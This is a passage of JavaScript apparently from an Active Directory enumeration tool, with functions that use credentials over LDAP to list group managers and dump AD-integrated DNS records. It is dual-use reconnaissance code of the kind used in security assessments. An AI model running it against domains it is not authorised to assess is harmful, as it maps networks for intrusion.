      let managed = e.attributes?.managedBy || '';
      if (Array.isArray(managed)) managed = managed[0];
      if (managed instanceof Uint8Array) managed = new TextDecoder().decode(managed);
      const match = String(managed).match(/^CN=([^,]+)/);
      log('ok', 'ldap', host, cn, `managed by: ${match ? match[1] : managed}`);
    }
    log('ok', 'ldap', host, 'managed-by', `${entries.length} group(s) with managers`);
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'managed-by', e.message);
    return null;
  }
}

export async function ldapDnsRecords(host, creds, opts, log, args) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const zone = args || domain;
    const entries = await searchAll(client, `DC=${zone},CN=MicrosoftDNS,DC=DomainDnsZones,${base}`, '(objectClass=dnsNode)', ['name', 'dc', 'dnsRecord']);
    for (const e of entries) {
      let name = e.attributes?.name || e.attributes?.dc || '?';
      if (Array.isArray(name)) name = name[0];
      if (name instanceof Uint8Array) name = new TextDecoder().decode(name);
      log('ok', 'ldap', host, 'dns', `${name}.${zone}`);
    }
    log('ok', 'ldap', host, 'dns-records', `${entries.length} record(s) in ${zone}`);
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'dns-records', e.message);
    return null;
  }
}
